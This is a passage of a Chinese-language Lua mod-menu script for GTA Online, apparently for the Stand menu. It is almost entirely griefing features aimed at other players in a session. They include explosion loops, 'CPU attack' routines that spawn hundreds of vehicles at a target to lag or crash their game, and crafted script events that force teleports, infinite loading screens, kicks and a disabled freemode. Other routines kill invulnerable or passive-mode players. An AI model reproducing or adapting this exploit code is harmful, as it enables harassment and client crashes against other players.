            FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(0, 75), 38, 1, false, false, 0, false)
            FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(0, 75), 38, 1, false, false, 0, false) 
        end


          if not players.exists(pid) then
              util.stop_thread()
          end
      end)

    local firw = {speed = 1000}
    menu.toggle_loop(friendly, '烟花攻击', {''}, '', function ()
          local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
          local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
          local weap = util.joaat('weapon_firework')
          WEAPON.REQUEST_WEAPON_ASSET(weap)
          for y = 0, 1 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x - math.random(0, 0), tar1.y - math.random(0, 0), tar1.z + math.random(0, 15), 200, 0, weap, 0, false, false, firw.speed)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x + math.random(0, 0), tar1.y + math.random(0, 0), tar1.z + math.random(0, 15), 200, 0, weap, 0, false, false, firw.speed)
            FIRE.ADD_EXPLOSION(tar1.x + math.random(0, 0), tar1.y + math.random(0, 0), tar1.z + math.random(0, 75), 70, 1, false, false, 0, false)
            FIRE.ADD_EXPLOSION(tar1.x - math.random(0, 0), tar1.y - math.random(0, 0), tar1.z + math.random(0, 75), 70, 1, false, false, 0, false) 
        end


          if not players.exists(pid) then
              util.stop_thread()
          end
      end)

    menu.toggle_loop(friendly, "循环烟花", {"fireworkloop"}, "", function()
        if players.exists(pid) then
            local player_pos = players.get_position(pid)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(friendly, "循环燃烧瓶", {"molotovloop"}, "", function()
        if players.exists(pid) then
            local player_pos = players.get_position(pid)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 3, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    local fake_pickup = 0
    local fake_pickup_names = {
        [0] = "钱袋",
        [1] = "人偶",
        [2] = "PQ豆"
    }
        local fake_pickups = {
        [0] = {
            "p_poly_bag_01_s"
        },
        [1] = {
            "vw_prop_vw_colle_alien",
            "vw_prop_vw_colle_beast",
            "vw_prop_vw_colle_imporage",
            "vw_prop_vw_colle_pogo",
            "vw_prop_vw_colle_prbubble",
            "vw_prop_vw_colle_rsrcomm",
            "vw_prop_vw_colle_rsrgeneric",
            "vw_prop_vw_colle_sasquatch"
        },
        [2] = {
            "prop_choc_pq"
        },
    }
    function _fake_pickup()
        util.create_tick_handler(function()
            local objects = fake_pickups[fake_pickup]
            local pickup_hash = util.joaat(objects[math.random(1, #objects)])
            local player_pos = players.get_position(pid)
            local pickup_pos = v3.new(player_pos.x, player_pos.y, player_pos.z + 2.25)
            local pickup_sound = "Bus_Schedule_Pickup"
            local pickup_sound_ref = "DLC_PRISON_BREAK_HEIST_SOUNDS"
            request_model(pickup_hash)
            local pickup = entities.create_object(pickup_hash, pickup_pos)
            ENTITY.SET_ENTITY_COLLISION(pickup, false, true)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(
                pickup, 1, 0, 0, 0,
                true, false, true, true
            )

            repeat
                player_pos = players.get_position(pid)
                pickup_pos = ENTITY.GET_ENTITY_COORDS(pickup, false)
                local is_height_reached = pickup_pos.z <= player_pos.z + 1.25

                util.yield()
            until is_height_reached

            AUDIO.PLAY_SOUND_FROM_COORD(
                -1, pickup_sound, player_pos.x, player_pos.y, player_pos.z, pickup_sound_ref, true, 1, false
            )
            entities.delete_by_handle(pickup)
            return false
        end)
    end

    local fake_pickup_slider = menu.slider_text(friendly, "虚假掉落", {"fakepickup"}, "", fake_pickup_names, function()
        _fake_pickup()
    end)

    util.create_tick_handler(function()
        if not players.exists(pid) then
            return false
        end

        fake_pickup = menu.get_value(fake_pickup_slider)
    end)



    local pteleportEntities = menu.list(playerMain, "传东西到玩家", {}, "")
    menu.action(pteleportEntities, "传NPC", {""}, "", function ()
        TpAllPeds(pid)
    end)
    menu.action(pteleportEntities, "传载具", {""}, "", function ()
        TpAllVehs(pid)
    end)
    menu.action(pteleportEntities, "传实体", {""}, "", function ()
        TpAllObjects(pid)
    end)
    menu.action(pteleportEntities, "传拾取物", {""}, "", function ()
        TpAllPickups(pid)
    end)

    menu.action(pteleportEntities, '传送玩家到目的地', {'tele'}, '将玩家传送到玩家在他们的地图上设置的航路点（支架用户必须在车辆中）可以被其他人使用，并且如果设置了航路点将重置您的航路点', function ()
       local x, y, z, b = players.get_waypoint(pid)
       if HUD.IS_WAYPOINT_ACTIVE() then
        local curway = HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(8))
        HUD.SET_WAYPOINT_OFF()
        HUD.SET_NEW_WAYPOINT(x, y)
        menu.trigger_commands("WPTP".. players.get_name(pid))
        util.yield(1500)
        HUD.SET_NEW_WAYPOINT(curway.x, curway.y)
        else
            HUD.SET_NEW_WAYPOINT(x, y)
            menu.trigger_commands("WPTP".. players.get_name(pid))
            HUD.SET_WAYPOINT_OFF()
       end

    end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.action(pteleportEntities, "将玩家传送到花园银行", {""}, "将玩家的车辆传送到花园银行的塔上", function()
        sqhy(pid)
    end)

		

    menu.action(pteleportEntities, "将玩家传送到高空", {""}, "", function()
        sqgk(pid)
    end)
	

	local cpuburn = menu.list(playerMain, "CPU攻击", {}, "")
	fish_options = menu.list(cpuburn, "CPU V1", {}, "")

	menu.divider(fish_options, "炸鱼")
	
    Ptools_PanTable = {}
    Ptools_PanCount = 1
    Ptools_FishPan = 20

    menu.action(fish_options, "炸鱼", {""}, "卡死", function ()
        local targetped = PLAYER.GET_PLAYER_PED(pid)
        local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)

        local hash = util.joaat("tug")
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end

        for i = 1, Ptools_FishPan do
            Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
            ----
            local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
            ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
            ----
            if SE_Notifications then
                util.toast("Spawned with index of " .. Ptools_PanCount)
            end
            Ptools_PanCount = Ptools_PanCount + 1
        end
    end)


    menu.slider(fish_options, "数量", {""}, "鱼的数量1-300", 1, 300, 20, 1, function(value)
        Ptools_FishPan = value
    end)

    menu.action(fish_options, "删除", {""}, "Yep", function ()
        for x = 1, 5, 1 do
            for i = 1, #Ptools_PanTable do
                entities.delete_by_handle(Ptools_PanTable[i])
                util.yield(10)
            end
        end
        --
        Ptools_PanCount = 1
        Ptools_PanTable = {}
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))
    end)
	
menu.action(cpuburn,"CPU V2", {}, "CPU v2", function() 
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		notification("开始干他", colors.pink)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("干完", colors.pink) 
		menu.trigger_commands("anticrashcamera off")
		util.yield(5000)
	end)

    menu.toggle_loop(cpuburn,"CPU V3", {"CPU v3"}, "CPU v3", function() 
		while not STREAMING.HAS_MODEL_LOADED(-305727417) do
			STREAMING.REQUEST_MODEL(-305727417)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
		notification("开始干他", colors.pink)
        menu.trigger_commands("violentfreeze" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("rockets" .. PLAYER.GET_PLAYER_NAME(pid))
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(-305727417, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("干完", colors.pink) 
        menu.trigger_commands("violentfreeze" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("rockets" .. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(5000)
	end)
	
    menu.action(cpuburn, "DDoS", {}, "通过向其路由器发送数据包对玩家进行DDoS攻击", function()
        util.toast("成功发送DDoS攻击到" ..players.get_name(pid))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("开个玩笑你个笨比")
    end)    

    local antimodder = menu.list(playerMain, "反作弊者", {}, "")
    local kill_godmode = menu.list(antimodder, "击杀无敌玩家", {}, "")
    menu.action(kill_godmode, "击杀无敌玩家", {""}, "适用于小菜单", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)

    menu.slider_text(kill_godmode, "压死无敌玩家", {}, "", {"Khanjali", "APC"}, function(index, veh)
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        local vehicle = util.joaat(veh)
        request_model(vehicle)

        pluto_switch veh do
            case "Khanjali":
            height = 2.8
            offset = 0
            break
            case "APC":
            height = 3.4
            offset = -1.5
            break
        end

        if TASK.IS_PED_STILL(player) then
            distance = 0
        elseif not TASK.IS_PED_STILL(player) then
            distance = 3
        end

        local vehicle1 = entities.create_vehicle(vehicle, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), offset, distance, height), ENTITY.GET_ENTITY_HEADING(player))
        local vehicle2 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle3 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle4 = entities.create_vehicle(vehicle, pos, 0)
        local spawned_vehs = {vehicle4, vehicle3, vehicle2, vehicle1}
        for i = 1, #spawned_vehs do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_vehs[i])
        end
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)

    player_toggle_loop(kill_godmode, pid, "炸死无敌玩家", {}, "被大多数菜单拦截", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        if not PED.IS_PED_DEAD_OR_DYING(ped) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) then
            util.trigger_script_event(1 << pid, {0xAD36AA57, pid, 0x96EDB12F, math.random(0, 0x270F)})
            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), pos.x, pos.y, pos.z, 2, 50, true, false, 0.0)
        end
    end)

    menu.action(kill_godmode, "眩晕爆炸", {"stun"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)

    menu.action(kill_godmode, "杀死无敌玩家", {"squish"}, "压死它们，直到它们死去。适用于大多数菜单。(注意：如果目标正在使用无布娃娃，则不会起作用).", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local khanjali = util.joaat("khanjali")
        request_model(khanjali)

        if TASK.IS_PED_STILL(ped) then
            distance = 0.0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 2.0
        end

        local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, distance, 2.8), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(khanjali, pos, 0)
        local vehicle3 = entities.create_vehicle(khanjali, pos, 0)
        local vehicle4 = entities.create_vehicle(khanjali, pos, 0)
        local spawned_vehs = {vehicle1, vehicle2, vehicle3, vehicle4}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0.0, 0.0, 3.0, 0.0, 0.0, 0.0, -180.0, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0.0, 3.0, 3.0, 0.0, 0.0, 0.0, -180.0, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0.0, 3.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end) 

    player_toggle_loop(kill_godmode, pid, "移除玩家无敌", {}, "被大多数菜单拦截", function()
        util.trigger_script_event(1 << pid, {113023613, pid, 1771544554, math.random(0, 9999)})
    end)

    player_toggle_loop(kill_godmode, pid, "移除无敌玩家武器", {}, "被小部分菜单拦截", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ped) and players.is_godmode(pid) then
            util.trigger_script_event(1 << pid, {113023613, pid, 1771544554, math.random(0, 9999)})
        end
    end)

    player_toggle_loop(kill_godmode, pid, "移除载具无敌", {"removevgm"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
            ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
        end
    end)

    menu.action(kill_godmode, "杀死被动模式玩家", {}, "", function()
        local coords = players.get_position(pid)
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords.z = coords.z + 5
        local playerCar = PED.GET_VEHICLE_PED_IS_IN(playerPed, false)
        if playerCar > 0 then
            entities.delete_by_handle(playerCar)
        end
        local carHash = util.joaat("dukes2")
        loadModel(carHash)
        local car = entities.create_vehicle(carHash, coords, 0)
        ENTITY.SET_ENTITY_VISIBLE(car, false, 0)
        ENTITY.APPLY_FORCE_TO_ENTITY(car, 1, 0.0, 0.0, -65, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
    end)

    menu.action(kill_godmode, "强杀", {""}, "强制杀死无敌玩家", function(on)
        local p_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        for _, v_ptr in pairs(entities.get_all_vehicles_as_pointers()) do 
            local v_pos = entities.get_position(v_ptr)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(p_ped), v_pos) < 200 then
                ENTITY.SET_ENTITY_HEALTH(entities.pointer_to_handle(v_ptr), 0.0)
                FIRE.ADD_EXPLOSION(v_pos.x, v_pos.y, v_pos.z, 17, 1.0, true, false, 100.0, false)
            end
        end

        for _, p_ptr in pairs(entities.get_all_peds_as_pointers()) do 
            local p_pos = entities.get_position(p_ptr)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(p_ped), p_pos) < 200 then 
                ENTITY.SET_ENTITY_HEALTH(entities.pointer_to_handle(p_ptr), 0.0)
                FIRE.ADD_EXPLOSION(p_pos.x, p_pos.y, p_pos.z, 17, 1.0, true, false, 100.0, false)
            end
        end

        local c = players.get_position(pid)
         FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 82, 1.0, true, false, 100.0, false)

        for _, v_ptr in pairs(entities.get_all_objects_as_pointers()) do 
            local o_pos = entities.get_position(v_ptr)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(p_ped), o_pos) < 20 then
                FIRE.ADD_EXPLOSION(o_pos.x, o_pos.y, o_pos.z, 17, 1.0, false, true, 0.0, false)
                util.yield(10)
            end
        end

    end)

menu.action(antimodder, "网络事件阻止", {}, "向正在载具中的玩家发送接管请求，如果他们阻止，会触发Stand的检测，但是其他作弊者也会检测到您", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(playerPed, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
    end
end)

    local inf_loading = menu.list(antimodder, "无限加载屏幕", {}, "")
    menu.action(inf_loading, "传送邀请", {}, "", function()
        util.trigger_script_event(1 << pid, {891653640, pid, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(inf_loading, "公寓邀请", {"invitehome"}, "", function()
        util.trigger_script_event(1 << pid, {-1796714618, pid, 0, 1, id})
    end)
        
    menu.action_slider(inf_loading, "资产邀请", {}, "单击以选择样式", {"游艇", "办公室", "会所", "办公室车库", "载具改装铺", "公寓"}, function(index, name)
        switch name do
            case "Yacht":
                util.trigger_script_event(1 << pid, {36077543, pid, 1})
                util.toast("游艇邀请已发送")
            break
            case "Office":
                util.trigger_script_event(1 << pid, {36077543, pid, 2})
                util.toast("办公室邀请已发送")
            break
            case "Clubhouse":
                util.trigger_script_event(1 << pid, {36077543, pid, 3})
                util.toast("会所邀请已发送")
            break
            case "Office Garage":
                util.trigger_script_event(1 << pid, {36077543, pid, 4})
                util.toast("办公室车库邀请已发送")
            break
            case "Custom Auto Shop":
                util.trigger_script_event(1 << pid, {36077543, pid, 5})
                util.toast("载具改装铺邀请已发送")
            break
            case "Apartment":
                util.trigger_script_event(1 << pid, {36077543, pid, 6})
                util.toast("公寓邀请已发送")
            break
        end
    end)

    player_toggle_loop(inf_loading, pid, "使该玩家黑屏", {}, "将此玩家传送到会所来达到黑屏", function()
        util.trigger_script_event(1 << pid, {891653640, pid, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.yield(1000)
    end)

        menu.action(inf_loading, "死亡屏障击杀", {"barrierkill"}, "对大多数菜单有效。(注意：只有在目标没有使用禁用死亡障碍的情况下才会起作用。)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local ped_dist = v3.distance(players.get_position(players.user()), players.get_position(pid))
        local cam_dist = v3.distance(pos, players.get_cam_pos(players.user()))
        local height = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped)

        if ped_dist > 1000.0 and cam_dist > 1000.0 then
            util.toast(players.get_name(pid) .. " is too far. :/")
            glitchplayer.value = false
        return end

        local hash = util.joaat("prop_windmill_01")
        local mdl = util.joaat("rallytruck")
        request_model(hash)
        request_model(mdl)
        for i = 0, 10 do
            if TASK.IS_PED_WALKING(ped) then
                spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 0.5, 0.0)
            elseif TASK.IS_PED_WALKING(ped) then
                spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 1.3, 0.0)
            else
                spawn_pos = players.get_position(pid)
            end
            if height < 0.0 then return end
            local obj = entities.create_object(hash, spawn_pos)
            local veh = entities.create_vehicle(mdl, spawn_pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(obj, false)
            ENTITY.SET_ENTITY_VISIBLE(veh, false)
            ENTITY.SET_ENTITY_INVINCIBLE(obj, true)
            ENTITY.SET_ENTITY_COLLISION(obj, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(150)
            entities.delete_by_handle(obj)
            entities.delete_by_handle(veh)
        end
    end)
	
    local tp_player = menu.list(playerMain, "传送玩家到...", {}, "")
    local clubhouse = menu.list(tp_player, "摩托帮会所", {}, "")
    local facility = menu.list(tp_player, "设施", {}, "")
    local warehouse = menu.list(tp_player, "仓库", {}, "")
    local arcade = menu.list(tp_player, "游戏厅", {}, "")
    local cayoperico = menu.list(tp_player, "传送邀请", {}, "")

    for id, name in pairs(All_business_properties) do
        if id <= 12 then
            menu.action(clubhouse, name, {}, "", function()
                util.trigger_script_event(1 << pid, {891653640, pid, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(1, 10)})
            end)
        elseif id > 12 and id <= 21 then
            menu.action(facility, name, {}, "", function()
                util.trigger_script_event(1 << pid, {891653640, pid, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end)
        elseif id > 21 then
            menu.action(arcade, name, {}, "", function() 
                util.trigger_script_event(1 << pid, {891653640, pid, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
            end)
        end
    end

    local small = menu.list(warehouse, "小型仓库", {}, "")
    local medium = menu.list(warehouse, "中型仓库", {}, "")
    local large = menu.list(warehouse, "大型仓库", {}, "")

    for id, name in pairs(small_warehouses) do
        menu.action(small, name, {}, "", function()
            util.trigger_script_event(1 << pid, {-1796714618, pid, 0, 1, id})
        end)
    end

    for id, name in pairs(medium_warehouses) do
        menu.action(medium, name, {}, "", function()
            util.trigger_script_event(1 << pid, {-1796714618, pid, 0, 1, id})
        end)
    end

    for id, name in pairs(large_warehouses) do
        menu.action(large, name, {}, "", function()
            util.trigger_script_event(1 << pid, {-1796714618, pid, 0, 1, id})
        end)
    end

        menu.action(tp_player, "破坏室内状态", {}, "玩家必须在一个公寓内,可通过重新加入战局取消.", function(s)
        if players.is_in_interior(pid) then
            util.trigger_script_event(1 << pid, {629813291, pid, pid, pid, pid, math.random(int_min, int_max), pid})
        else
            util.toast("玩家不在室内. :/")
        end
    end)

    menu.action(tp_player, "公寓邀请", {}, "已被大部分菜单阻挡", function()
        util.trigger_script_event(1 << pid, {-168599209, players.user(), pid, -1, 1, 1, 0, 1, 0}) 
    end)

    menu.action(cayoperico, "佩里科岛(有过场动画)", {"tpcayo"}, "已被大部分菜单阻挡", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 3, 1})
    end)

    menu.action(cayoperico, "佩里科岛(无过场动画)", {"tpcayo2"}, "已被大部分菜单阻挡", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 4, 1})
    end)

    menu.action(cayoperico, "佩里科岛 v2", {"tpcayo2"}, "已被大部分菜单阻挡", function()
        util.trigger_script_event(1 << pid, {-910497748, pid, 1})
    end)

    menu.action(cayoperico, "离开佩里科岛", {"cayoleave"}, "玩家必须在佩里科岛才能触发", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 3})
    end)

    menu.action(cayoperico, "从佩里科岛踢出", {"cayokick"}, "玩家必须在佩里科岛才能触发", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 4, 0})
    end)

        menu.action(cayoperico, "驱逐玩家", {"evict"}, "将玩家踢出室内.", function()
        if players.is_in_interior(pid) then
            menu.trigger_commands("interiorkick" .. players.get_name(pid))
        else
            util.toast("玩家不在室内. :/")
        end
    end)

    menu.action(cayoperico, "给这傻逼送进监狱", {"arrest"}, "已被大部分菜单阻挡.", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. players.get_name(pid))
        menu.trigger_commands("summon " .. players.get_name(pid))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos)
    end)

    menu.action(cayoperico, "传送沙滩", {""}, "", function()
        util.trigger_script_event(1 << pid, {330622597, pid, 0, 0, 4 ,0})
    end)

    function StandUser(pid) -- credit to lance for this
    if pid == players.user() then
        return true
    end
    if players.exists(pid) then
        for _, cmd in ipairs(menu.player_root(pid):getChildren()) do
            if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING and (cmd:refByRelPath("Stand User"):isValid() or cmd:refByRelPath("Stand User (Co-Loading"):isValid()) then
                return true
            end
        end
    end
    return false
end

    menu.action(cayoperico, "发送到介绍界面", {"intro"}, "让玩家进入《GTA Online》的介绍.", function()
        if StandUser(pid) then util.toast(stand_notif) util.stop_thread() end
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 20, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(cayoperico, "发送到高尔夫俱乐部", {"golf"}, "派遣玩家去打高尔夫.", function()
        if StandUser(pid) then util.toast(stand_notif) return end
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 193, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(cayoperico, "恶心人的自由模式", {"brickfreemode"}, "在他们的自由模式下，他们无法看到玩家列表，无法使用他们的互动菜单，也无法看到大多数的突发事件。.", function()
        if StandUser(pid) then util.toast(stand_notif) return end
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
